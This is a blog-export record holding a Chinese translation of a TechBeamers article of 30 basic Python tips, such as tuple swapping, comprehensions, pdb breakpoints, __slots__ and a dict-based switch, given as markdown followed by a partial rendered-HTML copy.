贴士与技巧，所有的这些技巧都能帮助你压缩代码并且优化运行。此外，你可以在日常工作中很容易地在真实项目中使用他们。\n\n每一个技巧都有一个示例并且给出简短的解释，如果要测试这些代码片段，你可以看一下这些 [在线虚拟 Python 运行终端](http://www.techbeamers.com/best-python-interpreter-execute-python-online/)。\n\n \n\n最近我们发布的另两个必看的 Python 资源：\n\n💡 [9 种优化 Python 代码的主要方式](http://www.techbeamers.com/python-code-optimization-tips-tricks/)\n\n💡 [发现在编程时应该避免的最常见的错误](http://www.techbeamers.com/python-programming-mistakes/)\n\n\n# 给程序员的 30 个基本 Python 贴士与技巧\n\n## 贴士#1. 原地交换两个数字\n\nPython 提供了一个直观的在一行代码中赋值与交换（变量值）的方法，请参见下面的示例：\n\n```python\nx, y = 10, 20\nprint(x, y)\n\nx, y = y, x\nprint(x, y)\n\n#1 (10, 20)\n#2 (20, 10)\n```\n赋值的右侧形成了一个新的元组，左侧立即解析（unpack）那个（未被引用的）元组到变量 &lt;a> 和 &lt;b>。\n\n一旦赋值完成，新的元组变成了未被引用状态并且被标记为可被垃圾回收，最终也完成了变量的交换。\n\n## 贴士#2. 链状比较操作符\n\n比较操作符的聚合是另一个有时很方便的技巧：\n\n```python\nn = 10\nresult = 1 < n < 20\nprint(result)\n\n# True\n\nresult = 1 > n <= 9\nprint(result)\n\n# False\n```\n \n## 贴士#3. 使用三元操作符来进行条件赋值\n\n三元操作符是 if-else 语句也就是条件操作符的一个快捷方式：\n\n```python\n[表达式为真的返回值] if [表达式] else [表达式为假的返回值]\n```\n这里给出几个你可以用来使代码紧凑简洁的例子。下面的语句是说“如果 y 是 9，给 x 赋值 10，不然赋值为 20”。如果需要的话我们也可以延长这条操作链。\n\n```python\nx = 10 if (y == 9) else 20\n```\n同样地，我们可以对类做这种操作：\n\n```python\nx = (classA if y == 1 else classB)(param1, param2)\n```\n\n在上面的例子里 classA 与 classB 是两个类，其中一个类的构造函数会被调用。\n\n下面是另一个多个条件表达式链接起来用以计算最小值的例子：\n\n```python\ndef small(a, b, c):\n    return a if a <= b and a <= c else (b if b <= a and b <= c else c)\n\nprint(small(1, 0, 1))\nprint(small(1, 2, 2))\nprint(small(2, 2, 3))\nprint(small(5, 4, 3))\n\n#Output\n#0 #1 #2 #3\n```\n\n我们甚至可以在列表推导中使用三元运算符：\n\n```python\n[m**2 if m > 10 else m**4 for m in range(50)]\n\n#=> [0, 1, 16, 81, 256, 625, 1296, 2401, 4096, 6561, 10000, 121, 144, 169, 196, 225, 256, 289, 324, 361, 400, 441, 484, 529, 576, 625, 676, 729, 784, 841, 900, 961, 1024, 1089, 1156, 1225, 1296, 1369, 1444, 1521, 1600, 1681, 1764, 1849, 1936, 2025, 2116, 2209, 2304, 2401]\n```\n\n## 贴士#4. 多行字符串\n\n基本的方式是使用源于 C 语言的反斜杠：\n\n```python\nmultiStr = \"select * from multi_row \\\nwhere row_id < 5\"\nprint(multiStr)\n\n# select * from multi_row where row_id < 5\n```\n另一个技巧是使用三引号：\n\n```python\nmultiStr = \"\"\"select * from multi_row \nwhere row_id < 5\"\"\"\nprint(multiStr)\n\n#select * from multi_row \n#where row_id < 5\n```\n \n\n上面方法共有的问题是缺少合适的缩进，如果我们尝试缩进会在字符串中插入空格。所以最后的解决方案是将字符串分为多行并且将整个字符串包含在括号中：\n\n```python\nmultiStr= (\"select * from multi_row \"\n            \"where row_id < 5 \"\n            \"order by age\")\nprint(multiStr)\n\n#select * from multi_row where row_id < 5 order by age\n```\n## 贴士#5. 存储列表元素到新的变量中\n\n我们可以使用列表来初始化多个变量，在解析列表时，变量的数目不应该超过列表中的元素个数：【译者注：元素个数与列表长度应该严格相同，不然会报错】\n\n```python\ntestList = [1,2,3]\nx, y, z = testList\n\nprint(x, y, z)\n\n#-> 1 2 3\n```\n## 贴士#6. 打印引入模块的文件路径\n\n如果你想知道引用到代码中模块的绝对路径，可以使用下面的技巧：\n\n```python\nimport threading \nimport socket\n\nprint(threading)\nprint(socket)\n\n#1- <module 'threading' from '/usr/lib/python2.7/threading.py'>\n#2- <module 'socket' from '/usr/lib/python2.7/socket.py'>\n```\n\n## 贴士#7. 交互环境下的 “_” 操作符\n\n这是一个我们大多数人不知道的有用特性，在 Python 控制台，不论何时我们测试一个表达式或者调用一个方法，结果都会分配给一个临时变量： _（一个下划线）。\n\n```python\n>>> 2 + 1\n3\n>>> _\n3\n>>> print _\n3\n```\n“_” 是上一个执行的表达式的输出。\n\n## 贴士#8. 字典/集合推导\n\n与我们使用的列表推导相似，我们也可以使用字典/集合推导，它们使用起来简单且有效，下面是一个例子：\n\n```python\ntestDict = {i: i * i for i in xrange(10)} \ntestSet = {i * 2 for i in xrange(10)}\n\nprint(testSet)\nprint(testDict)\n\n#set([0, 2, 4, 6, 8, 10, 12, 14, 16, 18])\n#{0: 0, 1: 1, 2: 4, 3: 9, 4: 16, 5: 25, 6: 36, 7: 49, 8: 64, 9: 81}\n```\n注：两个语句中只有一个 <:> 的不同，另，在 Python3 中运行上述代码时，将 &lt;xrange> 改为 &lt;range>。\n\n## 贴士#9. 调试脚本\n\n我们可以在 &lt;pdb> 模块的帮助下在 Python 脚本中设置断点，下面是一个例子：\n\n```python\nimport pdb\npdb.set_trace()\n```\n我们可以在脚本中任何位置指定 &lt;pdb.set_trace()> 并且在那里设置一个断点，相当简便。\n\n## 贴士#10. 开启文件分享\n\nPython 允许运行一个 HTTP 服务器来从根路径共享文件，下面是开启服务器的命令：\n\n### # Python 2\n```python\npython -m SimpleHTTPServer\n```\n### # Python 3\n```python\npython3 -m http.server\n```\n上面的命令会在默认端口也就是 8000 开启一个服务器，你可以将一个自定义的端口号以最后一个参数的方式传递到上面的命令中。\n\n## 贴士#11. 检查 Python 中的对象\n\n我们可以通过调用 dir() 方法来检查 Python 中的对象，下面是一个简单的例子：\n\n```python\ntest = [1, 3, 5, 7]\nprint( dir(test) )\n\n['__add__', '__class__', '__contains__', '__delattr__', '__delitem__', '__delslice__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__getslice__', '__gt__', '__hash__', '__iadd__', '__imul__', '__init__', '__iter__', '__le__', '__len__', '__lt__', '__mul__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__reversed__', '__rmul__', '__setattr__', '__setitem__', '__setslice__', '__sizeof__', '__str__', '__subclasshook__', 'append', 'count', 'extend', 'index', 'insert', 'pop', 'remove', 'reverse', 'sort']\n```\n## 贴士#12. 简化 if 语句\n\n我们可以使用下面的方式来验证多个值：\n```python\nif m in [1,3,5,7]:\n```\n而不是：\n\n```python\nif m==1 or m==3 or m==5 or m==7:\n```\n\n或者，对于 in 操作符我们也可以使用 '{1,3,5,7}' 而不是 '[1,3,5,7]'，因为 set 中取元素是 O(1) 操作。\n\n## 贴士#13. 运行时检测 Python 版本\n\n当正在运行的 Python 低于支持的版本时，有时我们也许不想运行我们的程序。为达到这个目标，你可以使用下面的代码片段，它也以可读的方式输出当前 Python 版本：\n\n```python\nimport sys\n\n#Detect the Python version currently in use.\nif not hasattr(sys, \"hexversion\") or sys.hexversion != 50660080:\n    print(\"Sorry, you aren't running on Python 3.5n\")\n    print(\"Please upgrade to 3.5.n\")\n    sys.exit(1)\n\n#Print Python version in a readable format.\nprint(\"Current Python version: \", sys.version)\n```\n\n或者你可以使用 sys.version_info >= (3, 5) 来替换上面代码中的 sys.hexversion != 50660080，这是一个读者的建议。\n\n在 Python 2.7 上运行的结果：\n\n```Python\n\nPython 2.7.10 (default, Jul 14 2015, 19:46:27)\n[GCC 4.8.2] on linux\n\nSorry, you aren't running on Python 3.5\n\nPlease upgrade to 3.5.\n```\n \n在 Python 3.5 上运行的结果：\n\n```Python\n\nPython 3.5.1 (default, Dec 2015, 13:05:11)\n[GCC 4.8.2] on linux\n\nCurrent Python version:  3.5.2 (default, Aug 22 2016, 21:11:05) \n[GCC 5.3.0]\n```\n \n## 贴士#14. 组合多个字符串\n\n如果你想拼接列表中的所有记号，比如下面的例子：\n\n```python\n>>> test = ['I', 'Like', 'Python', 'automation']\n```\n现在，让我们从上面给出的列表元素新建一个字符串：\n```python\n>>> print ''.join(test)\n```\n## 贴士#15. 四种翻转字符串/列表的方式\n\n### # 翻转列表本身\n\n```python\ntestList = [1, 3, 5]\ntestList.reverse()\nprint(testList)\n\n#-> [5, 3, 1]\n```\n### # 在一个循环中翻转并迭代输出\n\n```python\nfor element in reversed([1,3,5]):\n    print(element)\n\n#1-> 5\n#2-> 3\n#3-> 1\n```\n\n### # 一行代码翻转字符串\n\n```python\n\"Test Python\"[::-1]\n```\n输出为 “nohtyP tseT”\n\n### # 使用切片翻转列表\n\n```python\n[1, 3, 5][::-1]\n```\n上面的命令将会给出输出 [5,3,1]。\n\n## #贴士#16. 玩转枚举\n\n使用枚举可以在循环中方便地找到（当前的）索引：\n\n```python \ntestlist = [10, 20, 30]\nfor i, value in enumerate(testlist):\n    print(i, ': ', value)\n\n#1-> 0 : 10\n#2-> 1 : 20\n#3-> 2 : 30\n```\n## 贴士#17. 在 Python 中使用枚举量\n\n我们可以使用下面的方式来定义枚举量：\n\n```python\nclass Shapes:\n    Circle, Square, Triangle, Quadrangle = range(4)\n\nprint(Shapes.Circle)\nprint(Shapes.Square)\nprint(Shapes.Triangle)\nprint(Shapes.Quadrangle)\n\n#1-> 0\n#2-> 1\n#3-> 2\n#4-> 3\n```\n## 贴士#18. 从方法中返回多个值\n\n并没有太多编程语言支持这个特性，然而 Python 中的方法确实（可以）返回多个值，请参见下面的例子来看看这是如何工作的：\n\n```python\n# function returning multiple values.\ndef x():\n    return 1, 2, 3, 4\n\n# Calling the above function.\na, b, c, d = x()\n\nprint(a, b, c, d)\n\n#-> 1 2 3 4\n```\n\n## 贴士#19. 使用 * 运算符（splat operator）来 unpack 函数参数\n\n* 运算符（splat operator）提供了一个艺术化的方法来 unpack 参数列表，为清楚起见请参见下面的例子：\n```python\ndef test(x, y, z):\n    print(x, y, z)\n\ntestDict = {'x': 1, 'y': 2, 'z': 3} \ntestList = [10, 20, 30]\n\ntest(*testDict)\ntest(**testDict)\ntest(*testList)\n\n#1-> x y z\n#2-> 1 2 3\n#3-> 10 20 30\n```\n## 贴士#20. 使用字典来存储选择操作\n\n我们能构造一个字典来存储表达式：\n```python\nstdcalc = {\n    'sum': lambda x, y: x + y,\n    'subtract': lambda x, y: x - y\n}\n\nprint(stdcalc['sum'](9,3))\nprint(stdcalc['subtract'](9,3))\n```\n\n## 贴士#21. 一行代码计算任何数的阶乘\n\n### Python 2.x.\n\n```python\nresult = (lambda k: reduce(int.__mul__, range(1,k+1),1))(3)\nprint(result)\n\n#-> 6\n```\n### Python 3.x.\n\n```python\nimport functools\nresult = (lambda k: functools.reduce(int.__mul__, range(1,k+1),1))(3)\nprint(result)\n\n#-> 6\n```\n## 贴士#22. 找到列表中出现最频繁的数\n\n```python\ntest = [1,2,3,4,2,2,3,1,4,4,4]\nprint(max(set(test), key=test.count))\n\n#-> 4\n```\n## 贴士#23. 重置递归限制\n\nPython 限制递归次数到 1000，我们可以重置这个值：\n\n```python\nimport sys\n\nx=1001\nprint(sys.getrecursionlimit())\n\nsys.setrecursionlimit(x)\nprint(sys.getrecursionlimit())\n\n#-> 1000\n#-> 1001\n```\n请只在必要的时候采用上面的技巧。\n\n## 贴士#24. 检查一个对象的内存使用\n\n在 Python 2.7 中，一个 32 比特的整数占用 24 字节，在 Python 3.5 中占用 28 字节。为确定内存使用，我们可以调用 getsizeof 方法：\n\n在 Python 2.7 中\n\n```python\nimport sys\nx=1\nprint(sys.getsizeof(x))\n\n#-> 24\n```\n在 Python 3.5 中\n\n```python\nimport sys\nx=1\nprint(sys.getsizeof(x))\n\n#-> 28\n```\n## 贴士#25. 使用 __slots__ 来减少内存开支\n\n你是否注意到你的 Python 应用占用许多资源特别是内存？有一个技巧是使用 __slots__ 类变量来在一定程度上减少内存开支。\n\n```python\nimport sys\nclass FileSystem(object):\n\n    def __init__(self, files, folders, devices):\n        self.files = files\n        self.folders = folders\n        self.devices = devices\nprint(sys.getsizeof( FileSystem ))\n\nclass FileSystem1(object):\n\n    __slots__ = ['files', 'folders', 'devices']\n    def __init__(self, files, folders, devices):\n        self.files = files\n        self.folders = folders\n        self.devices = devices\n\nprint(sys.getsizeof( FileSystem1 ))\n\n#In Python 3.5\n#1-> 1016\n#2-> 888\n\n# 经测试 在我的 win10 python27 中跑出的结果是：\n#1-> 452\n#2-> 512\n```\n\n很明显，你可以从结果中看到确实有内存使用上的节省，但是你只应该在一个类的内存开销不必要得大时才使用 __slots__。只在对应用进行性能分析后才使用它，不然地话，你只是使得代码难以改变而没有真正的益处。\n\n所以，这种比较方式是不那么让人信服的，使用 __slots__ 主要是用以限定对象的属性信息，另外，当生成对象很多时花销可能会小一些，具体可以参见 [python 官方文档](https://docs.python.org/3/reference/datamodel.html?highlight=__slots__#object.__slots__):\n\nThe slots declaration takes a sequence of instance variables and reserves just enough space in each instance to hold a value for each variable. Space is saved because dict is not created for each instance. \n\n也可参考廖雪峰老师的 [使用__slots__](http://www.liaoxuefeng.com/wiki/001374738125095c955c1e6d8bb493182103fac9270762a000/0013868200605560b1bd3c660bf494282ede59fee17e781000) \n\n\n## 贴士#26. 使用 lambda 来模仿输出方法\n\n```python\nimport sys\nlprint=lambda *args:sys.stdout.write(\" \".join(map(str,args)))\nlprint(\"python\", \"tips\",1000,1001)\n\n#-> python tips 1000 1001\n```\n\n## 贴士#27. 从两个相关的序列构建一个字典\n\n```python\nt1 = (1, 2, 3)\nt2 = (10, 20, 30)\n\nprint(dict (zip(t1,t2)))\n\n#-> {1: 10, 2: 20, 3: 30}\n```\n\n## 贴士#28. 一行代码搜索字符串的多个前后缀\n\n```python\nprint(\"http://www.google.com\".startswith((\"http://\", \"https://\")))\nprint(\"http://www.google.co.uk\".endswith((\".com\", \".co.uk\")))\n\n#1-> True\n#2-> True\n```\n\n## 贴士#29. 不使用循环构造一个列表\n\n```python\nimport itertools\ntest = [[-1, -2], [30, 40], [25, 35]]\nprint(list(itertools.chain.from_iterable(test)))\n\n#-> [-1, -2, 30, 40, 25, 35]\n```\n## 贴士#30. 在 Python 中实现一个真正的 switch-case 语句\n\n下面的代码使用一个字典来模拟构造一个 switch-case。\n\n```python\ndef xswitch(x): \n    return xswitch._system_dict.get(x, None)\n\nxswitch._system_dict = {'files': 10, 'folders': 5, 'devices': 2}\n\nprint(xswitch('default'))\nprint(xswitch('devices'))\n\n#1-> None\n#2-> 2\n```\n\n结语 – 给程序员的基本 Python 贴士与技巧\n\n我们希望上述的基本的 Python 贴士与技巧可以帮助你快速地 & 有效地完成任务，你可以在作业与项目中使用他们。\n\n听从你的回馈会使我们变得更好，所以请分享你的想法。\n\n你甚至可以要求我们写一个你选择的话题，我们会将其加入到我们的写作列表中。【*】\n\n最后，如果你喜欢这个文章，请在社交媒体上分享给你的朋友。\n\n坚持学习，\n\nTechBeamers.\n\n> 本文由 伯乐在线 - 阿喵 翻译，艾凌风 校稿。英文出处：Meenakshi Agarwal。","slug":"python_30_tips","published":1,"updated":"2017-08-27T16:05:33.000Z","photos":[],"link":"","_id":"cjh9h0k8e000imkwbm8tsqorg","content":"<p>如果你已经在用 python 了，相信这篇 blog 会对你有帮助的。<br>如果你还没有使用 python，相信看完下面 python 的实现，你会觉得<strong>编程也是一件幸福的事</strong>：）</p>\n<p><img src=\"/Image/python-love.png\" alt=\"Python_Love\"></p>\n<p>如果你让一个 Python 程序员说一下 Python 的优势，他会说简洁以及高可读是最有影响力的优势。为证明上述两点，在这个 Python 教程里，我们将聊聊许多基本的 Python 建议和技巧。</p>\n<a id=\"more\"></a>\n<p>我们从开始使用 Python 便收集这些有用的捷径（贴士与技巧）。分享一些我们知道，同时又能造福于人的知识，有什么事情比这更棒吗？</p>\n<p>过去我们分享过 一些 <a href=\"http://www.techbeamers.com/top-10-python-coding-tips-for-beginners/\" target=\"_blank\" rel=\"external\">给初学者的 Python 编程贴士</a> 旨在优化代码并且减少编码工作，我们的读者仍旧很乐意阅读它。</p>\n<p>所以今天我们带来另一些基本的 Python 贴士与技巧，所有的这些技巧都能帮助你压缩代码并且优化运行。此外，你可以在日常工作中很容易地在真实项目中使用他们。</p>\n<p>每一个技巧都有一个示例并且给出简短的解释，如果要测试这些代码片段，你可以看一下这些 <a href=\"http://www.techbeamers.com/best-python-interpreter-execute-python-online/\" target=\"_blank\" rel=\"external\">在线虚拟 Python 运行终端</a>。</p>\n<p>最近我们发布的另两个必看的 Python 资源：</p>\n<p>💡 <a href=\"http://www.techbeamers.com/python-code-optimization-tips-tricks/\" target=\"_blank\" rel=\"external\">9 种优化 Python 代码的主要方式</a></p>\n<p>💡 <a href=\"http://www.techbeamers.com/python-programming-mistakes/\" target=\"_blank\" rel=\"external\">发现在编程时应该避免的最常见的错误</a></p>\n<h1 id=\"给程序员的-30-个基本-Python-贴士与技巧\"><a href=\"#给程序员的-30-个基本-Python-贴士与技巧\" class=\"headerlink\" title=\"给程序员的 30 个基本 Python 贴士与技巧\"></a>给程序员的 30 个基本 Python 贴士与技巧</h1><h2 id=\"贴士-1-原地交换两个数字\"><a href=\"#贴士-1-原地交换两个数字\" class=\"headerlink\" title=\"贴士#1. 原地交换两个数字\"></a>贴士#1. 原地交换两个数字</h2><p>Python 提供了一个直观的在一行代码中赋值与交换（变量值）的方法，请参见下面的示例：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\">x, y = <span class=\"number\">10</span>, <span class=\"number\">20</span></div><div class=\"line\">print(x, y)</div><div class=\"line\"></div><div class=\"line\">x, y = y, x</div><div class=\"line\">print(x, y)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#1 (10, 20)</span></div><div class=\"line\"><span class=\"comment\">#2 (20, 10)</span></div></pre></td></tr></table></figure>\n<p>赋值的右侧形成了一个新的元组，左侧立即解析（unpack）那个（未被引用的）元组到变量 &lt;a&gt; 和 &lt;b&gt;。</p>\n<p>一旦赋值完成，新的元组变成了未被引用状态并且被标记为可被垃圾回收，最终也完成了变量的交换。</p>\n<h2 id=\"贴士-2-链状比较操作符\"><a href=\"#贴士-2-链状比较操作符\" class=\"headerlink\" title=\"贴士#2. 链状比较操作符\"></a>贴士#2. 链状比较操作符</h2><p>比较操作符的聚合是另一个有时很方便的技巧：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\">n = <span class=\"number\">10</span></div><div class=\"line\">result = <span class=\"number\">1</span> &lt; n &lt; <span class=\"number\">20</span></div><div class=\"line\">print(result)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># True</span></div><div class=\"line\"></div><div class=\"line\">result = <span class=\"number\">1</span> &gt; n &lt;= <span class=\"number\">9</span></div><div class=\"line\">print(result)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># False</span></div></pre></td></tr></table></figure>\n<h2 id=\"贴士-3-使用三元操作符来进行条件赋值\"><a href=\"#贴士-3-使用三元操作符来进行条件赋值\" class=\"headerlink\" title=\"贴士#3. 使用三元操作符来进行条件赋值\"></a>贴士#3. 使用三元操作符来进行条件赋值</h2><p>三元操作符是 if-else 语句也就是条件操作符的一个快捷方式：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">[表达式为真的返回值] <span class=\"keyword\">if</span> [表达式] <span class=\"keyword\">else</span> [表达式为假的返回值]</div></pre></td></tr></table></figure>\n<p>这里给出几个你可以用来使代码紧凑简洁的例子。下面的语句是说“如果 y 是 9，给 x 赋值 10，不然赋值为 20”。如果需要的话我们也可以延长这条操作链。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">x = <span class=\"number\">10</span> <span class=\"keyword\">if</span> (y == <span class=\"number\">9</span>) <span class=\"keyword\">else</span> <span class=\"number\">20</span></div></pre></td></tr></table></figure>\n<p>同样地，我们可以对类做这种操作：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">x = (classA <span class=\"keyword\">if</span> y == <span class=\"number\">1</span> <span class=\"keyword\">else</span> classB)(param1, param2)</div></pre></td></tr></table></figure>\n<p>在上面的例子里 classA 与 classB 是两个类，其中一个类的构造函数会被调用。</p>\n<p>下面是另一个多个条件表达式链接起来用以计算最小值的例子：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">small</span><span class=\"params\">(a, b, c)</span>:</span></div><div class=\"line\">    <span class=\"keyword\">return</span> a <span class=\"keyword\">if</span> a &lt;= b <span class=\"keyword\">and</span> a &lt;= c <span class=\"keyword\">else</span> (b <span class=\"keyword\">if</span> b &lt;= a <span class=\"keyword\">and</span> b &lt;= c <span class=\"keyword\">else</span> c)</div><div class=\"line\"></div><div class=\"line\">print(small(<span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>))</div><div class=\"line\">print(small(<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">2</span>))</div><div class=\"line\">print(small(<span class=\"number\">2</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>))</div><div class=\"line\">print(small(<span class=\"number\">5</span>, <span class=\"number\">4</span>, <span class=\"number\">3</span>))</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#Output</span></div><div class=\"line\"><span class=\"comment\">#0 #1 #2 #3</span></div></pre></td></tr></table></figure>\n<p>我们甚至可以在列表推导中使用三元运算符：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">[m**<span class=\"number\">2</span> <span class=\"keyword\">if</span> m &gt; <span class=\"number\">10</span> <span class=\"keyword\">else</span> m**<span class=\"number\">4</span> <span class=\"keyword\">for</span> m <span class=\"keyword\">in</span> range(<span class=\"number\">50</span>)]</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#=&gt; [0, 1, 16, 81, 256, 625, 1296, 2401, 4096, 6561, 10000, 121, 144, 169, 196, 225, 256, 289, 324, 361, 400, 441, 484, 529, 576, 625, 676, 729, 784, 841, 900, 961, 1024, 1089, 1156, 1225, 1296, 1369, 1444, 1521, 1600, 1681, 1764, 1849, 1936, 2025, 2116, 2209, 2304, 2401]</span></div></pre></td></tr></table></figure>\n<h2 id=\"贴士-4-多行字符串\"><a href=\"#贴士-4-多行字符串\" class=\"headerlink\" title=\"贴士#4. 多行字符串\"></a>贴士#4. 多行字符串</h2><p>基本的方式是使用源于 C 语言的反斜杠：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">multiStr = <span class=\"string\">\"select * from multi_row \\</span></div><div class=\"line\">where row_id &lt; 5\"</div><div class=\"line\">print(multiStr)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># select * from multi_row where row_id &lt; 5</span></div></pre></td></tr></table></figure>\n<p>另一个技巧是使用三引号：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">multiStr = <span class=\"string\">\"\"\"select * from multi_row </span></div><div class=\"line\">where row_id &lt; 5\"\"\"</div><div class=\"line\">print(multiStr)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#select * from multi_row </span></div><div class=\"line\"><span class=\"comment\">#where row_id &lt; 5</span></div></pre></td></tr></table></figure>\n<p>上面方法共有的问题是缺少合适的缩进，如果我们尝试缩进会在字符串中插入空格。所以最后的解决方案是将字符串分为多行并且将整个字符串包含在括号中：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">multiStr= (<span class=\"string\">\"select * from multi_row \"</span></div><div class=\"line\">            <span class=\"string\">\"where row_id &lt; 5 \"</span></div><div class=\"line\">            <span class=\"string\">\"order by age\"</span>)</div><div class=\"line\">print(multiStr)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#select * from multi_row where row_id &lt; 5 order by age</span></div></pre></td></tr></table></figure>\n<h2 id=\"贴士-5-存储列表元素到新的变量中\"><a href=\"#贴士-5-存储列表元素到新的变量中\" class=\"headerlink\" title=\"贴士#5. 存储列表元素到新的变量中\"></a>贴士#5. 存储列表元素到新的变量中</h2><p>我们可以使用列表来初始化多个变量，在解析列表时，变量的数目不应该超过列表中的元素个数：【译者注：元素个数与列表长度应该严格相同，不然会报错】</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">testList = [<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>]</div><div class=\"line\">x, y, z = testList</div><div class=\"line\"></div><div class=\"line\">print(x, y, z)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#-&gt; 1 2 3</span></div></pre></td></tr></table></figure>\n<h2 id=\"贴士-6-打印引入模块的文件路径\"><a href=\"#贴士-6-打印引入模块的文件路径\" class=\"headerlink\" title=\"贴士#6. 打印引入模块的文件路径\"></a>贴士#6. 打印引入模块的文件路径</h2><p>如果你想知道引用到代码中模块的绝对路径，可以使用下面的技巧：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">import</span> threading </div><div class=\"line\"><span class=\"keyword\">import</span> socket</div><div class=\"line\"></div><div class=\"line\">print(threading)</div><div class=\"line\">print(socket)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#1- &lt;module 'threading' from '/usr/lib/python2.7/threading.py'&gt;</span></div><div class=\"line\"><span class=\"comment\">#2- &lt;module 'socket' from '/usr/lib/python2.7/socket.py'&gt;</span></div></pre></td></tr></table></figure>\n<h2 id=\"贴士-7-交互环境下的-“-”-操作符\"><a href=\"#贴士-7-交互环境下的-“-”-操作符\" class=\"headerlink\" title=\"贴士#7. 交互环境下的 “_” 操作符\"></a>贴士#7. 交互环境下的 “_” 操作符</h2><p>这是一个我们大多数人不知道的有用特性，在 Python 控制台，不论何时我们测试一个表达式或者调用一个方法，结果都会分配给一个临时变量： _（一个下划线）。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"number\">2</span> + <span class=\"number\">1</span></div><div class=\"line\"><span class=\"number\">3</span></div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>_</div><div class=\"line\"><span class=\"number\">3</span></div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"keyword\">print</span> _</div><div class=\"line\"><span class=\"number\">3</span></div></pre></td></tr></table></figure>\n<p>“_” 是上一个执行的表达式的输出。</p>\n<h2 id=\"贴士-8-字典-集合推导\"><a href=\"#贴士-8-字典-集合推导\" class=\"headerlink\" title=\"贴士#8. 字典/集合推导\"></a>贴士#8. 字典/集合推导</h2><p>与我们使用的列表推导相似，我们也可以使用字典/集合推导，它们使用起来简单且有效，下面是一个例子：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\">testDict = &#123;i: i * i <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> xrange(<span class=\"number\">10</span>)&#125; </div><div class=\"line\">testSet = &#123;i * <span class=\"number\">2</span> <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> xrange(<span class=\"number\">10</span>)&#125;</div><div class=\"line\"></div><div 